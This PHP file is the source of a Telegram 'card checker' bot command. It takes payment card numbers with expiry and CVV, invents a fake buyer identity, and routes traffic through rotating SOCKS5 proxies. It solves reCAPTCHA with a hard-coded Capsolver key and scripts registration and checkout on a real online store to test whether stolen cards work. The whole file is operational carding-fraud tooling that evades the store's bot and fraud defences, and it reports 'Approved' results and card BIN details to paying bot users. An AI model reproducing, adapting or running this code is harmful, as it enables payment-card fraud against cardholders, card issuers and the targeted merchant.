<?php
list($cmd) = explode(" ", $message);
if($cmd == "/ys" or $cmd == ".ys" or $cmd == "!ys"){
sendaction($chatId, typing);
$NameGater ='Yiris';
$gateway = '/ys :'.$NameGater;
Contador($gateway);
    if($userId == "5168647868"){
        goto a;
    }
is_gateroff($NameGater); //off Gater
a:
is_premium(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>$NameGater
Format: <code>cc|m|y|cvv</code></b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

AntiScript();
is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>ϟ CHECKING YOUR CARD
[ 🝂 WAIT A FEW SECONDS 🟥 ]
Gateway » $NameGater
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #

$rotate = rotate();
$socks5 = socks5();
if(strlen($ano) == 2 ){
  $ano = "20".$ano;
}

if(strlen($mes) == 1){
    $mes = "0".$mes;
  }

$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$password = substr(str_shuffle('abcdefMNOPQ56789_!'), 0, 12);


$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];



$user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU iPadOS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/605.1.15",
  ];
  
$ua = $user_agents[array_rand($user_agents)];


$curl = new CurlX;


$maxRetries = 3; // número máximo de intentos
$retries = 0; // contador de intentos




while ($retries < $maxRetries) {
    try { 
        $cookie = uniqid();
        $server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];


        $headers = [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'upgrade-insecure-requests: 1',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
        ];
        $req2 = $curl::Get('https://www.shopulstandards.com/PurchaseProduct.aspx?UniqueKey=32572', $headers, $cookie, $server);
        if ($req2->code != "200") {
            throw new Exception("Connection error on request attempt #1 " . $retries . ". Please try again.");
        }

        $view = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
        $viewgen = ($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"'));
        $previ = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="', '"'));
        $requestve = ($curl::ParseString($req2->body, '<input type="hidden" name="ctl00$__RequestVerificationToken" id="__RequestVerificationToken" value="', '"'));


        $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://www.shopulstandards.com',
        'referer: https://www.shopulstandards.com/PurchaseProduct.aspx?UniqueKey=32572',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
    ];
    $req2 = $curl::Post('https://www.shopulstandards.com/PurchaseProduct.aspx?UniqueKey=32572', '__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE='.$view.'&__VIEWSTATEGENERATOR='.$viewgen.'&__VIEWSTATEENCRYPTED=&__PREVIOUSPAGE='.$previ.'&ctl00%24__RequestVerificationToken='.$requestve.'&ctl00%24HeaderSearchBox=&ctl00%24ddlLanguage=en-US&ctl00%24ddlCurrency=USD&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24rptFormats%24ctl01%24cbxSelectedFormat=on&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24rptFormats%24ctl01%24hdnFormatID=3&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24rptFormats%24ctl02%24hdnFormatID=1&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24rptFormats%24ctl03%24hdnFormatID=2&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24AdditionalSubscription%24rptSubscriptionVariants%24ctl01%24hdnPurchaseSubtypeID=2&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24AdditionalSubscription%24rptSubscriptionVariants%24ctl01%24hdnSubscriptionPurchaseTypeID=43&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24AdditionalSubscription%24rptSubscriptionVariants%24ctl02%24hdnPurchaseSubtypeID=1&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24AdditionalSubscription%24rptSubscriptionVariants%24ctl02%24hdnSubscriptionPurchaseTypeID=43&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24AdditionalSubscription%24NoSubscriptionSelected=on&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24AdditionalSubscription%24hdnNoSubscriptionSubtype=3&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24AdditionalSubscription%24hdnDocumentPurchaseTypeID=42&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24PDFQuantityDropdown=1&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24HardcopyQuantityDropdown=1&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24hiddenSelectedPurchaseType=Secure+PDF+%26+Hardcopy+Combo&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24hdnDeliveryFormatID=3&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24hdnPurchaseSubTypeID=3&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24hdnPurchaseTypeID=42&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24hdnSelectedLanguage=English&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24hdnExpiringAssignedCount=0&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24hdnRenewalFlag=false&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24hdnPDFQuantityDropdown=&ctl00%24ContentPlaceHolder1%24PurchaseStandardsProduct%24hdnHardcopyQuantityDropdown=&ctl00%24ContentPlaceHolder1%24AddToCartButton=Add+to+Cart&ctl00%24txtJoinMailingList=&g-recaptcha-response=&ctl00%24qualtricsEmailAddress=', $headers, $cookie, $server);

    if ($req2->code != "200") {
        throw new Exception("Connection error on request attempt #2 " . $retries . ". Please try again.");
    }


    $view = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
    $viewgen = ($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"'));
    $previ = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="', '"'));
    $requestve = ($curl::ParseString($req2->body, '<input type="hidden" name="ctl00$__RequestVerificationToken" id="__RequestVerificationToken" value="', '"'));


    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://www.shopulstandards.com',
        'referer: https://www.shopulstandards.com/Cart.aspx',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
    ];
    $req2 = $curl::Post('https://www.shopulstandards.com/Cart.aspx', '__EVENTTARGET=ctl00%24ctl00%24ContentPlaceHolder1%24ContentPlaceHolder1%24lbnCheckout&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATEFIELDCOUNT=2&__VIEWSTATE='.$view.'&__VIEWSTATEGENERATOR='.$viewgen.'&__VIEWSTATEENCRYPTED=&__PREVIOUSPAGE='.$previ.'&ctl00%24ctl00%24__RequestVerificationToken='.$requestve.'&ctl00%24ctl00%24HeaderSearchBox=&ctl00%24ctl00%24ddlLanguage=en-US&ctl00%24ctl00%24ddlCurrency=USD&ctl00%24ctl00%24ContentPlaceHolder1%24ContentPlaceHolder1%24cart%24CartDisplay%24gvProducts%24ctl02%24variantID=59505&ctl00%24ctl00%24txtJoinMailingList=&g-recaptcha-response=&ctl00%24ctl00%24qualtricsEmailAddress=', $headers, $cookie, $server);
    if ($req2->code != "200") {
        throw new Exception("Connection error on request attempt #3 " . $retries . ". Please try again.");
    }
    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0'
    ];
    $req2 = $curl::Get('https://www.shopulstandards.com/Account/Register.aspx?ReturnURL=Checkout.aspx', $headers, $cookie, $server);

    if ($req2->code != "200") {
        throw new Exception("Connection error on request attempt #4 " . $retries . ". Please try again.");
    }
    $view = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
    $view1 = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATE1" id="__VIEWSTATE1" value="', '"'));
    $viewgen = ($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"'));
    $previ = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="', '"'));
    $requestve = ($curl::ParseString($req2->body, '<input type="hidden" name="ctl00$__RequestVerificationToken" id="__RequestVerificationToken" value="', '"'));

    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://www.shopulstandards.com',
        'referer: https://www.shopulstandards.com/Account/Register.aspx?ReturnURL=Checkout.aspx',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
    ];
    $req2 = $curl::Post('https://www.shopulstandards.com/Account/Register.aspx?ReturnURL=Checkout.aspx', '__EVENTTARGET=ctl00%24ContentPlaceHolder1%24lbnCreateAccount&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATEFIELDCOUNT=2&__VIEWSTATE='.$view.'&__VIEWSTATE1='.$view1.'&__VIEWSTATEGENERATOR='.$viewgen.'&__VIEWSTATEENCRYPTED=&__PREVIOUSPAGE='.$previ.'&ctl00%24__RequestVerificationToken='.$requestve.'&ctl00%24HeaderSearchBox=&ctl00%24ddlLanguage=en-US&ctl00%24ddlCurrency=USD&ctl00%24ContentPlaceHolder1%24FirstName='.$firstname.'&ctl00%24ContentPlaceHolder1%24LastName='.$lastname.'&ctl00%24ContentPlaceHolder1%24rblCompany=N%2FA&ctl00%24ContentPlaceHolder1%24Company=N%2FA&ctl00%24ContentPlaceHolder1%24Address1='.urlencode($street).'&ctl00%24ContentPlaceHolder1%24Address2=&ctl00%24ContentPlaceHolder1%24City='.urlencode($city).'&ctl00%24ContentPlaceHolder1%24Region%24DropDown='.urlencode($state).'&ctl00%24ContentPlaceHolder1%24PostalCode=98501&ctl00%24ContentPlaceHolder1%24Country=UNITED+STATES&ctl00%24ContentPlaceHolder1%24CompanyPhone='.urlencode($phone).'&ctl00%24ContentPlaceHolder1%24EmailAddress='.urlencode($email).'&ctl00%24ContentPlaceHolder1%24UserName='.$lastname.rand(41,99999).'&ctl00%24ContentPlaceHolder1%24NewPassword='.$password.'&ctl00%24ContentPlaceHolder1%24Password2='.$password.'&ctl00%24ContentPlaceHolder1%24ddlInterestCategory=3&ctl00%24ContentPlaceHolder1%24ddlIndustry=7&ctl00%24ContentPlaceHolder1%24ddlUserRole=6&ctl00%24ContentPlaceHolder1%24chkAdditionalMarketing=on&ctl00%24ContentPlaceHolder1%24chkTermsOfService=on&ctl00%24txtJoinMailingList=&g-recaptcha-response=&ctl00%24qualtricsEmailAddress=', $headers, $cookie, $server);


    if ($req2->code != "200") {
        throw new Exception("Connection error on request attempt #5 " . $retries . ". Please try again.");
    }

    $view = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
    $view1 = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATE1" id="__VIEWSTATE1" value="', '"'));
    $viewgen = ($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"'));
    $previ = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="', '"'));
    $requestve = ($curl::ParseString($req2->body, '<input type="hidden" name="ctl00$__RequestVerificationToken" id="__RequestVerificationToken" value="', '"'));

    $cost = ($curl::ParseString($req2->body, '<span id="ContentPlaceHolder1_ShippingRatesList_shippingRates_Price_0" class="shippingPrice">$', '</span>'));
    $addr = ($curl::ParseString($req2->body, '<div class="large-8 small-12 columns"><select name="ctl00$ContentPlaceHolder1$BillingAddress$ddlAddress" onchange="javascript:setTimeout(&#39;__doPostBack(\&#39;ctl00$ContentPlaceHolder1$BillingAddress$ddlAddress\&#39;,\&#39;\&#39;)&#39;, 0)" id="ContentPlaceHolder1_BillingAddress_ddlAddress">', '</select></div>'));
    $idaddr = ($curl::ParseString($addr, '<option selected="selected" value="', '"'));

    $solution = $solver->recaptchaV2(
        \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
        [
          'websiteURL'    => 'https://www.shopulstandards.com/',
          'websiteKey'    => '6Lcqn7UZAAAAAMEHl2SLdNfX65Z71qIt-Or6SdDg',
        ]
    );
    $captcha = $solution["gRecaptchaResponse"];

    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://www.shopulstandards.com',
        'referer: https://www.shopulstandards.com/Checkout.aspx',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
    ];
    $req5 = $curl::Post('https://www.shopulstandards.com/Checkout.aspx', '__EVENTTARGET=ctl00%24ContentPlaceHolder1%24lbnPurchase&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATEFIELDCOUNT=2&__VIEWSTATE='.$view.'&__VIEWSTATE1='.$view1.'&__VIEWSTATEGENERATOR='.$viewgen.'&__VIEWSTATEENCRYPTED=&__PREVIOUSPAGE='.$previ.'&ctl00%24__RequestVerificationToken='.$requestve.'&ctl00%24HeaderSearchBox=&ctl00%24ddlLanguage=en-US&ctl00%24ddlCurrency=USD&ctl00%24ContentPlaceHolder1%24CartDisplay%24gvProducts%24ctl02%24variantID=59505&ctl00%24ContentPlaceHolder1%24BillingAddress%24ddlAddress='.$idaddr.'&ctl00%24ContentPlaceHolder1%24BillingAddress%24FirstName='.$firstname.'&ctl00%24ContentPlaceHolder1%24BillingAddress%24LastName='.$lastname.'&ctl00%24ContentPlaceHolder1%24BillingAddress%24Company=N%2FA&ctl00%24ContentPlaceHolder1%24CreditCard%24txtName='.$firstname.'+'.$lastname.'&ctl00%24ContentPlaceHolder1%24CreditCard%24txtCardNumber='.$cc.'&ctl00%24ContentPlaceHolder1%24CreditCard%24ddlCreditCardExpMonth='.$mes.'&ctl00%24ContentPlaceHolder1%24CreditCard%24ddlCreditCardExpYear='.$ano.'&ctl00%24ContentPlaceHolder1%24CreditCard%24txtCVV='.$cvv.'&ctl00%24ContentPlaceHolder1%24chkSameAsBilling=on&ctl00%24ContentPlaceHolder1%24ShippingRatesList%24hdnCost='.$cost.'&ctl00%24ContentPlaceHolder1%24ShippingRatesList%24hdnId=3&ctl00%24ContentPlaceHolder1%24ShippingRatesList%24shippingRates%24ctrl0%24btnSelectPrice=btnSelectPrice&ctl00%24ContentPlaceHolder1%24txtMessage=&ctl00%24ContentPlaceHolder1%24chkTermsOfService=on&g-recaptcha-response='.$captcha.'&ctl00%24txtJoinMailingList=&g-recaptcha-response=&ctl00%24qualtricsEmailAddress='.urlencode($email).'', $headers, $cookie, $server);
    if ($req5->code != "200") {
        throw new Exception("Connection error on request attempt #6 " . $retries . ". Please try again.");
    }
        break; 
    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
            echo "Intento $retries: " . $e->getMessage() . "\n" ;
            return;
        }
    }
}
$mgs = ($curl::ParseString($req5->body, '<span id="ContentPlaceHolder1_CCErrors" class="h1" style="color:Red;font-weight:bold;">', '</span>'));



$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);


bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>ϟ CHECKING YOUR CARD
[ ALMOST FINISHED 🟩 ]
Gateway » $NameGater
CARD » <code>$cc|$mes|$ano|$cvv</code>
CHECKED BY: <a href='tg://user?id=$userId'>$username</a> [<code>$Rank</code>]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);

if(substr_count($req5->body, '"success":true') || substr_count($req5->body, "New payment method added") || substr_count($req5->body, "Duplicate card exists in the vault")){
$status = "Approved ✅";
$response = "Charged 1$";
}elseif(substr_count($req5->body, "DECLINED CVV2")){
$status = "Approved ✅";
$response = "DECLINED CVV2";
}elseif(substr_count($req5->body, "Gateway Rejected: avs_and_cvv")){
$status = "Approved ✅";
$response = "$mgs";
}elseif(substr_count($req5->body, "Gateway Rejected: avs")){
$status = "Approved ✅";
$response = "$mgs";
}elseif(substr_count($req5->body, "Card Issuer Declined CVV")){
$status = "Approved ✅";
$response = "$mgs";
}elseif(substr_count($req5->body, "Insufficient Funds") || substr_count($req5->body, "Insufficient funds")){
$status = "Approved ✅";
$response = "$mgs";
}elseif(substr_count($curl, "Status code 81801, 81808, 81811: Addresses must have at least one field filled in., Postal code is required., Street address is required.")){
$status = "DECLINED!🔴";
$response = "Declined";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "$mgs";
   }

bot('editMessageText',[
    'chat_id'=>$chatId,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>Card ⤿  <code>$cc|$mes|$ano|$cvv</code> 
Status ⤿  $status
Response ⤿ $response 
Gateway ⤿ $NameGater
──────────────────────
◈Country ⤿ <code>$country </code>$emoji 
◈Type ⤿ <code>$type</code> 
◈Level ⤿ <code>$scheme</code>
◈Vendor ⤿ <code>$brand</code>
◈Bank ⤿ <code>$bank </code> 
──────────────────────
Time ⤿  $tiempo s
@RitaaChk_Bot
Chk By ⤿ <a href='tg://user?id=$userId'>$username</a>[$Rank]</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);


}

?>

